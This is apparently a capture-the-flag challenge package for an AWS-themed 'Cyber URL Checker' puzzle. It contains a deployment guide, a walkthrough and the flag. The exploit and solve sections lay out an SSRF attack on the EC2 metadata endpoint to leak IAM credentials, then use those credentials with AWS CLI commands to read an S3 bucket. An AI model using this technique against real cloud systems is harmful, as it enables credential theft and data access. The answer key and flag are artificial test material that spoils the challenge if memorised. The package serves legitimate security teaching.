# Title
The Tenney Disappearance


# Description
Detective Christina Krypto was one of the best in the NYPD Cybercrime Division, known for her relentless pursuit of digital criminals. She was investigating a massive cloud security breach linked to stolen credentials—an attack that allowed an unknown entity to siphon classified government and corporate data.

Then, she vanished without a trace.

The only lead left behind? Her personal workstation, still running a custom-built Cyber URL Checker—a tool she used to analyze suspicious links for potential security flaws. The last URL she checked seems to have triggered something before she disappeared.

Her workstation is still active at http://35.93.151.76:5000. If you can retrace her steps and uncover what she was looking at, you might find the truth—and the secret hidden in the cloud.

# Hint
Detective Krypto was investigating AWS infrastructure vulnerabilities. Reports suggest she was last seen looking at a specific metadata endpoint. If someone had access to cloud credentials but couldn't use them, where would they look to investigate further?


Fuck you liam <3. I am putting this here cause I wont bother making a solve script id rather bring at all down and up if i have to.
## Magpie CTF AWS Deployment Setup

This guide walks you through setting up the **AWS infrastructure** and **Flask-based Cyber URL Checker** for challenge.

---

### 1 Prerequisites
Before you begin, ensure you have:
- **AWS CLI** installed and configured (`aws configure`)
- **Terraform** installed (`terraform -v`)
- **An AWS account** with permissions to create EC2, S3, IAM roles
- **SSH key pair** (`id_ed25519` and `id_ed25519.pub`)

---

### 2 Generate an SSH Key Pair (If Not Already Created)
If you don’t have an SSH key, generate one:

```sh
ssh-keygen -t ed25519 -f id_ed25519 -N ""
```

Move it into your Terraform directory.

---

### 3 Set Up Terraform & Deploy Infrastructure
1. **Edit `main.tf` to include your AWS region & profile.**  
   If using a specific AWS profile, ensure `provider "aws"` has:
   ```hcl
   provider "aws" {
     region  = "us-west-2"  # Change if needed
     profile = "my-profile"
   }
   ```

2. **Initialize Terraform:**
   ```sh
   terraform init
   ```

3. **Plan the deployment:**
   ```sh
   terraform plan
   ```

4. **Apply the Terraform configuration (This creates EC2, S3, IAM Role, Security Groups, and uploads files):**
   ```sh
   terraform apply -auto-approve
   ```

---

### 4 Configure S3 Bucket Permissions
1. **Go to the AWS S3 console** → Select **`magpie2025-secret-25`**.
2. Click **Permissions** → **Object Ownership** → Set to **"Bucket owner preferred"**.
3. **Save Changes**.

---

### 5 SSH into the EC2 Instance & Run Setup
1. Get the EC2 **public IP** from Terraform’s output or the AWS console:
   ```sh
   terraform output ec2_public_ip
   ```

2. **SSH into the instance**:
   ```sh
   ssh -i id_ed25519 ubuntu@<EC2_PUBLIC_IP>
   ```

3. **Run the setup script manually**:
   ```sh
   chmod +x /home/ubuntu/startup.sh
   sudo /home/ubuntu/startup.sh
   sudo bash /home/ubuntu/startup.sh
   ```

---

### 6 Verify Flask App is Running
1. Check if the container is running:
   ```sh
   sudo docker ps
   ```

2. If running, test the app in your browser:
   ```
   http://<EC2_PUBLIC_IP>:5000
   ```

3. If not running, manually start the container:
   ```sh
   sudo docker restart cyber-url-checker
   ```

---

### 7 Exploit Testing
1. **Submit a URL like `http://169.254.169.254/latest/meta-data/iam/security-credentials/`** in the form.
2. You should see IAM role credentials returned.
3. **Use the leaked credentials** to list S3 buckets:
   ```sh
   AWS_ACCESS_KEY_ID="LEAKED_KEY" AWS_SECRET_ACCESS_KEY="LEAKED_SECRET" aws s3 ls
   ```

4. Download the flag:
   ```sh
   AWS_ACCESS_KEY_ID="LEAKED_KEY" AWS_SECRET_ACCESS_KEY="LEAKED_SECRET" aws s3 cp s3://magpie2025-secret-25/flag.txt .
   ```

---

### 8 Cleanup
Once testing is complete, destroy the infrastructure:
```sh
terraform destroy -auto-approve
```

---

### 9 Common Issues & Fixes
✅ **Terraform Hangs on EC2 Setup:**  
- SSH in and manually run `/home/ubuntu/startup.sh`

✅ **Flask App Not Running:**  
- Restart with `sudo docker restart cyber-url-checker`

✅ **Cannot List S3 Buckets (`AccessDenied` Error):**  
- Ensure `s3:GetObject` and `s3:ListBucket` permissions are correct in Terraform IAM policy.

✅ **AWS Credentials Expired:**  
- Generate new ones by re-running the exploit.


# Solve

1. Make a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to find the IAM role that is associated with the EC2.
2. Make a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM ROLE>` to determine the accesskeyid and secretaccesskey of the AWS IAM Role.
3. On a terminal with the AWS CLI installed, run `aws configure` and configure the Access Key, Secret Access Key, and the region. The region can be guessed either by the IP of the EC2/website (curl -O https://ip-ranges.amazonaws.com/ip-ranges.json), or they can guess. 
4. Determine what permissions the user has, either through a brute force, or by just checking some common ones. This use also has the ability to read S3 buckets.
5. Run `aws s3 ls`, which will show all S3 buckets the user has access to. 
6. Run ` aws s3 s3://magpie2025-secret/ ls` or ` aws s3 ls s3://magpie2025-secret-25/` to see all the files in the bucket.
7. Run ` aws s3 cp s3://magpie2025-secret/flag.txt .` to download the flag. 

Most of the ` magpie2025-secret` refrences are changed to the actual s3 bucket name which is ` magpie2025-secret-25` in this instant and may be subject to change

# Flag

magpie{14m_15_700_345y_70_m355_up}